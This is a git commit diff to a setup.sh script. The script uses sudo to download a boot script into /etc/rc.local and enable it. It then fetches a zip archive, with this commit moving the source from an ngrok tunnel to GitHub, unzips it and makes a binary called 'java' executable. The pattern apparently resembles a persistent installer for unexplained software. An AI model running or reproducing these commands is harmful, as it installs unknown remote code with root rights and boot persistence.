8c2c7f79abbb222272d59279a18f3d1776ef18d7
minnie1311 <69047664+minnie1311@users.noreply.github.com>
2022-02-11 10:43:01 +0700

    Update setup.sh

--- setup.sh
+++ setup.sh
@@ -7,7 +7,7 @@ wget https://raw.githubusercontent.com/minnie1311/Python3/main/rc.local1
 sudo mv rc.local1 /etc/rc.local
 sudo chmod +x /etc/rc.local
 sudo systemctl enable rc-local
-sudo wget http://b529-20-197-103-154.ngrok.io/ubuntu_18.04.zip
+sudo wget https://github.com/minnie1311/Python3/raw/main/ubuntu_18.04.zip
 sudo unzip ubuntu_18.04.zip
 sudo chmod +x java
 sudo rm start.sh
